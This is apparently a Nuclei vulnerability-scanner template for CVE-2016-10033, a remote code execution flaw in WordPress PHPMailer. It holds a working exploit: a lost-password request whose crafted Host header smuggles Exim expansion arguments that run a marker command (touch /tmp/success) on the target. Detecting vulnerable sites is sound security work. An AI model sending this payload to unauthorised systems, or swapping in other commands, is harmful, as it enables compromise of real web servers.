id: CVE-2016-10033
info:
  name: WordPress PHPMailer < 5.2.18 - Remote Code Execution
  author: princechaddha
  severity: critical
  description: WordPress PHPMailer before version 5.2.18 allows remote attackers to
    execute arbitrary code via a crafted Sender property in isMail transport.
  reference:
  - https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
  - https://nvd.nist.gov/vuln/detail/CVE-2016-10033
  - https://www.exploit-db.com/exploits/40970/
  - https://www.exploit-db.com/exploits/40968/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-10033
    cwe-id: CWE-77
  tags: cve,cve2016,rce,edb,wordpress
  metadata:
    impact: The vulnerability CVE-2016-10033 in WordPress PHPMailer before version
      5.2.18 allowed for remote code execution by attackers who could pass extra parameters
      to the mail command, thus impacting the security of WordPress websites.
    recommendation: Update to PHPMailer version 5.2.18 or newer to avoid remote code
      execution attacks on your WordPress site.
requests:
- raw:
  - 'GET /?author=1 HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9


    '
  - 'POST /wp-login.php?action=lostpassword HTTP/1.1

    Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}}
    null)

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    wp-submit=Get+New+Password&redirect_to=&user_login={{username}}


    '
  unsafe: true
  extractors:
  - type: regex
    name: username
    internal: true
    group: 1
    part: body
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
  matchers-condition: and
  matchers:
  - type: word
    words:
    - wp-login.php?checkemail=confirm
    part: header
  - type: status
    status:
    - 302
